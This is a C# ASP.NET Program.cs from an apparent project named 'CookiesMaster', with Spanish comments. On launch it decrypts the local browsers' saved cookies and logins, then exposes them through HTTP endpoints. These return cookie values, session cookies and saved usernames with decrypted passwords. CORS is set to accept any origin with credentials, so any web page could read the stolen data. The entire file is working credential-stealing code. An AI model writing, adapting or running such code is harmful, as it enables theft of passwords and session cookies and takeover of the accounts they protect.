using System.Text.RegularExpressions;
using CookiesMaster;
using CookiesMaster.Utils;

Config.Debug = false;
Config.Export = false;
BrowserDecrypt.Run();


var builder = WebApplication.CreateBuilder(args);
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();
builder.Services.AddControllers();
builder.Services.AddCors();

var app = builder.Build();
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseCors(x => x
    .AllowAnyMethod()
    .AllowAnyHeader()
    .SetIsOriginAllowed(_ => true)
    .AllowCredentials()
);

app.UseRouting();
app.UseDefaultFiles();
app.UseStaticFiles();


var cookies = BrowserDecrypt.Cookies;
var logins = BrowserDecrypt.Logins;


//OBTENER TODAS LAS COOKIES DECIFFRADAS DE UN NAVEGADOR
app.MapGet("/cookies/{browser}", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        return TypedResults.Ok(cookies[browserType].Select(c => new
        {
            hostkey = c.HostKey,
            name = c.Name,
            path = c.Path,
            value = c.Value
        }));
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

// TOP 10 PAGINAS WEB MAS VISITADAS DE UN NAVEGADOR
app.MapGet("/top10/{browser}", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        var top10 = cookies[browserType]
            .GroupBy(c => c.HostKey)
            .OrderByDescending(g => g.Count())
            .Take(10).Select(g => new
            {
                host = g.Key,
                count = g.Count()
            }).ToList();
        return TypedResults.Ok(top10);
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

//COUNT DE COOKIES DE UN NAVEGADOR
app.MapGet("/cookies/{browser}/count", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        return TypedResults.Ok(cookies[browserType].Count);
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

//OBTENER NUMERO DE PAGINAS WEB SIN REPETICIÓN DE UN NAVEGADOR A PARTIR DE LAS COOKIES
app.MapGet("/pages/{browser}", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        var pages = cookies[browserType].Select(c => c.HostKey).Distinct().ToList();
        return TypedResults.Ok(new
        {
            count = pages.Count,
            pages
        });
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

//OBTENER LAS COOKIES QUE SON DE SESIONES (NO PERSISTENTES)
app.MapGet("/cookies/{browser}/session", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        var sessionCookies = cookies[browserType].Where(c => !c.IsPersistent).ToList();
        return TypedResults.Ok(new
        {
            count = sessionCookies.Count,
            cookies = sessionCookies.Select(c => new
            {
                hostkey = c.HostKey,
                name = c.Name,
                path = c.Path,
                value = c.Value
            })
        });
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

//OBTENER COOKIES MEDIANTE EXPRESION REGULAR PARA HOSTKEY (USA REGEX)
app.MapGet("/cookies/{browser}/regex/{hostKey}", IResult (string browser, string hostKey) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        var regex = new Regex(hostKey);
        var cookiesRegex = cookies[browserType].Where(c => c.HostKey != null && regex.IsMatch(c.HostKey)).ToList();
        return TypedResults.Ok(cookiesRegex);
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});


//OBTENER TODOS LOS LOGINS DECIFFRADOS DE UN NAVEGADOR
app.MapGet("/logins/{browser}", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        var loginsData = logins[browserType];
        return TypedResults.Ok(new
        {
            count = loginsData.Count,
            logins = loginsData.Select(l => new
            {
                origin = l.OriginUrl,
                action = l.ActionUrl,
                username = l.UsernameValue,
                password = l.PasswordValue,
                passwordDecrypted = l.Password
            })
        });
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

app.MapGet("/logins/{browser}/count", IResult (string browser) =>
{
    try
    {
        var browserType = BrowserDecrypt.FromName(browser);
        return TypedResults.Ok(logins[browserType].Count);
    }
    catch (Exception e)
    {
        return TypedResults.BadRequest(e.Message);
    }
});

//cors allow all


app.Run();